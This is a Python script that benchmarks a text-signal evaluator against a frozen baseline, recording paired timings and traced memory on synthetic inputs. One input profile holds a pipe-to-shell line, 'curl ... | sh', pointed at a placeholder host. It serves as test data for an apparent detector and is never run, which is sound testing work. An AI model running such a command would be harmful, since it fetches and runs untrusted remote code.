"""Paired synthetic PS timings and traced allocation; never execute submitted code."""
import argparse
from datetime import datetime, timezone
import hashlib
import importlib.util
import json
import math
import os
from pathlib import Path
import platform
import statistics
import time
import tracemalloc
import sys
ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
from protocol.reports import write_report
BASELINE = 'eval/methods/context-v6-eager.py'
BEFORE_SHA = 'b1c604ff79fd77bc5f08cf79f9161d70fd1cfe30b5dce40ee6149ba262c51ff6'
SIZES = (2000, 20000, 200000)
FORMS = {'ordinary': 'An ordinary explanation about gardening and the weather. ',
         'download_only': 'curl https://example.invalid/path ',
         'command': 'curl https://example.invalid/path | sh; ',
         'warning': 'do not run curl https://example.invalid/path | sh; '}
REPEATS = 21

def module(path):
    spec = importlib.util.spec_from_file_location(path.replace('/', '_'), ROOT / path)
    result = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(result)
    return result

def sources():
    return {p: hashlib.sha256((ROOT/p).read_bytes()).hexdigest() for p in
            [BASELINE, 'services/evaluator/app.py', 'scripts/measure-ps-efficiency.py']}

def outcome(result):
    return {'candidates': result['candidates'], 'calibration_id': result['calibration_id'],
            'model_names_revisions': [(r['name'], r['revision']) for r in result['models']]}

def quantiles(values):
    ordered = sorted(values)
    return {'samples_ms': values, 'sample_count': len(values),
            'p50_ms': ordered[math.ceil(len(ordered)*.5)-1],
            'p95_ms': ordered[math.ceil(len(ordered)*.95)-1],
            'max_ms': max(values), 'quantile_method': 'nearest_rank'}

def peak(fn, doc):
    tracemalloc.start()
    try:
        result = fn(doc)
        used = tracemalloc.get_traced_memory()[1]
        return used, outcome(result)
    finally:
        tracemalloc.stop()

def measure():
    before = sources()
    if before[BASELINE] != BEFORE_SHA:
        raise ValueError('Frozen baseline identity mismatch')
    old, new = module(BASELINE), module('services/evaluator/app.py')
    rows = []
    for name, part in FORMS.items():
        for size in SIZES:
            text = (part * (size // len(part) + 1))[:size]
            a, b = old.Doc(text=text), new.Doc(text=text)
            expected = outcome(old.signals(a))
            if outcome(new.signals(b)) != expected:
                raise ValueError('Candidate semantics changed')
            timings = {'before': [], 'after': []}
            for i in range(REPEATS):
                order = [('before', old.signals, a), ('after', new.signals, b)]
                if i % 2: order.reverse()
                for label, fn, doc in order:
                    started = time.perf_counter_ns()
                    result = fn(doc)
                    duration = (time.perf_counter_ns() - started) / 1_000_000
                    if outcome(result) != expected or duration <= 0:
                        raise ValueError('Unstable outcome or invalid clock sample')
                    timings[label].append(duration)
            old_peak, old_result = peak(old.signals, a)
            new_peak, new_result = peak(new.signals, b)
            if old_result != expected or new_result != expected:
                raise ValueError('Allocation probe changed outcome')
            pairs = [x/y for x, y in zip(timings['before'], timings['after'])]
            rows.append({'profile': name, 'input_codepoints': size,
                         'before': quantiles(timings['before']), 'after': quantiles(timings['after']),
                         'paired_median_speedup': statistics.median(pairs),
                         'before_peak_python_traced_bytes': old_peak,
                         'after_peak_python_traced_bytes': new_peak,
                         'peak_measurement_is_not_process_rss': True,
                         'candidate_outputs_equal': True})
    stable = before == sources()
    return {'captured_at': datetime.now(timezone.utc).isoformat(), 'pass': stable,
            'kind': 'paired_synthetic_ps_efficiency', 'sources': before,
            'source_unchanged_during_execution': stable,
            'execution_host': {'system': platform.system(), 'machine': platform.machine(),
                               'logical_cpus': os.cpu_count(), 'python': platform.python_version()},
            'profiles': rows, 'repeats_per_profile': REPEATS, 'alternating_execution_order': True,
            'scope': 'Warm rule calls only; not imports, browser startup, redaction, network or physical-phone latency.',
            'population_performance_claimed': False, 'independent_accuracy_evidence': False,
            'user_content_used': False, 'commands_executed': False, 'network_requests': 0,
            'release_approved': False}

if __name__ == '__main__':
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument('--output')
    args = p.parse_args()
    report = measure()
    if args.output: write_report(args.output, report)
    print(json.dumps({'pass': report['pass'], 'profiles': len(report['profiles']),
                      'ordinary': [{k:r[k] for k in ['input_codepoints','paired_median_speedup',
                                  'before_peak_python_traced_bytes','after_peak_python_traced_bytes']}
                                   for r in report['profiles'] if r['profile'] == 'ordinary']}))
    raise SystemExit(0 if report['pass'] else 1)
